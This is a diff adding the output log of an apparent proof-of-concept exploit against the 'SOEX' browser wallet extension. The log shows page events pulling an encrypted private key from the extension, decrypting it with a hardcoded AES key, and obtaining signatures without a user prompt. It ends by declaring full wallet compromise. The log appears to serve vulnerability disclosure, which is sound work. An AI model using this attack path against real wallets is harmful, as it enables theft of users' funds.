@@ -1,0 +1,38 @@
+[SOEX PoC] http://localhost:3000  — open in Chrome with SOEX extension + wallet unlocked
+
+[05:44:19.376] Page loaded — waiting 800ms for content script...
+[05:44:20.384] [attempt 1] firing events...
+[05:44:20.442] [2] wallet address: 0x9aF24540EDD55e3Bf98bCB04Dc798e791ef30402
+[05:44:20.736] [F1 ✓] signMessageSyncSuccess received!
+[05:44:20.737]   enc_privkey : a79ec0f0ea049b8821d6fcd716421637aa27bf8cded82a238abbb390c9a62c46eb55dbc79970e3b2d1a64beb7a10687487b7f6def260dcb8e6387eed6aa5f47d8eb29c446bf2f5b5a370ad146ac860bc177d9954541d3fc12186362dd6fed49d7a7c13fe20b30ba9051ceb15966930034f
+[05:44:20.739]   aes_key     : 39313966663965663534623839656534 (HARDCODED)
+[F1 DECRYPTED] privkey=059b0f7358b6e0b4f31c64d24f0a62b6a688bdd0de59987e25d6c0dd35bb6f5b  address=0x9aF24540EDD55e3Bf98bCB04Dc798e791ef30402
+[05:44:20.847] [F1-ALT ✓] encryptPrivateKeySuccess — key+cipher in same event!
+[05:44:20.849]   state (sha1): 03196e62a2bba4cd  →  aesKey: 30333139366536326132626261346364
+[05:44:20.876]   enc_privkey : 59e8714d839808d9bf9aa4a686ac43e22edd355d342c230ca9db325abdc154cfa1a6790bee3015d3a09de25d41c080ae48d5e92bf5d6ef909697038aae4d27e396d1b275db1137c70af7506c49e11409ee11289f470a590135aa663339ac5fbdf1b39f39e3a3d54f016c5bef5f120ca180
+[F1-ALT DECRYPTED] privkey=059b0f7358b6e0b4f31c64d24f0a62b6a688bdd0de59987e25d6c0dd35bb6f5b  address=0x9aF24540EDD55e3Bf98bCB04Dc798e791ef30402
+[05:44:21.003] [F2 ✓] signMessageSuccess (no popup): 092a4ee6e1087c5118c0eb9dd67c51d0d5fe5b9e9ec3425f91fe7543f6b877510a9df357e577dc302fc2ebb828d95dceb0c71c698a7a2011c4b8a5820136d11301
+[05:44:21.137] [F2 ✓] evmPersonalSignSuccess (no popup): 0x0x4184bb8e63ccfe496f0f1d1dfd145a086fc3185fde9a101322ae3695827a425f292a730aea44d8645bdbc0b8f4521c0016b5624e4784f4b9b6d35f83751d93a51c
+[05:44:21.147] [attempt 2] firing events...
+[05:44:21.148] [done] private key captured — stopping retries
+[05:44:21.154] [2] wallet address: 0x9aF24540EDD55e3Bf98bCB04Dc798e791ef30402
+[05:44:21.285] [F1 ✓] signMessageSyncSuccess received!
+[05:44:21.290]   enc_privkey : a79ec0f0ea049b8821d6fcd716421637aa27bf8cded82a238abbb390c9a62c46eb55dbc79970e3b2d1a64beb7a10687487b7f6def260dcb8e6387eed6aa5f47d8eb29c446bf2f5b5a370ad146ac860bc177d9954541d3fc12186362dd6fed49d7a7c13fe20b30ba9051ceb15966930034f
+[05:44:21.294]   aes_key     : 39313966663965663534623839656534 (HARDCODED)
+[F1 DECRYPTED] privkey=059b0f7358b6e0b4f31c64d24f0a62b6a688bdd0de59987e25d6c0dd35bb6f5b  address=0x9aF24540EDD55e3Bf98bCB04Dc798e791ef30402
+[05:44:21.374] [F1-ALT ✓] encryptPrivateKeySuccess — key+cipher in same event!
+[05:44:21.376]   state (sha1): 96cf19f75df4690c  →  aesKey: 39366366313966373564663436393063
+[05:44:21.376]   enc_privkey : ddc37b4f4cbd63ed68b7182e2cea9010db2e8565cdca57bd6f302bb2fdd2d1d8ef50e59426327287a40f0bd37b18ff565807c7c3a1c75c37f1e2c0af380c5f9a391ebba155985ebefa75be4ae397fb185a7325893ef6678d1c42b7eab921a9d87fc083ac9c403645f1e1ec2db4bf6bfe91
+[F1-ALT DECRYPTED] privkey=059b0f7358b6e0b4f31c64d24f0a62b6a688bdd0de59987e25d6c0dd35bb6f5b  address=0x9aF24540EDD55e3Bf98bCB04Dc798e791ef30402
+[05:44:21.507] [F2 ✓] signMessageSuccess (no popup): 092a4ee6e1087c5118c0eb9dd67c51d0d5fe5b9e9ec3425f91fe7543f6b877510a9df357e577dc302fc2ebb828d95dceb0c71c698a7a2011c4b8a5820136d11301
+[05:44:21.622] [F2 ✓] evmPersonalSignSuccess (no popup): 0x0x4184bb8e63ccfe496f0f1d1dfd145a086fc3185fde9a101322ae3695827a425f292a730aea44d8645bdbc0b8f4521c0016b5624e4784f4b9b6d35f83751d93a51c
+[05:44:24.380]   privkey     : 059b0f7358b6e0b4f31c64d24f0a62b6a688bdd0de59987e25d6c0dd35bb6f5b
+[05:44:24.380]   address     : 0x9aF24540EDD55e3Bf98bCB04Dc798e791ef30402
+[05:44:24.381]   ✓ FULL WALLET COMPROMISE — funds can be drained
+[05:44:24.542]   privkey     : 059b0f7358b6e0b4f31c64d24f0a62b6a688bdd0de59987e25d6c0dd35bb6f5b
+[05:44:24.542]   address     : 0x9aF24540EDD55e3Bf98bCB04Dc798e791ef30402
+[05:44:24.842]   privkey     : 059b0f7358b6e0b4f31c64d24f0a62b6a688bdd0de59987e25d6c0dd35bb6f5b
+[05:44:24.843]   address     : 0x9aF24540EDD55e3Bf98bCB04Dc798e791ef30402
+[05:44:24.843]   ✓ FULL WALLET COMPROMISE — funds can be drained
+[05:44:25.187]   privkey     : 059b0f7358b6e0b4f31c64d24f0a62b6a688bdd0de59987e25d6c0dd35bb6f5b
+[05:44:25.188]   address     : 0x9aF24540EDD55e3Bf98bCB04Dc798e791ef30402
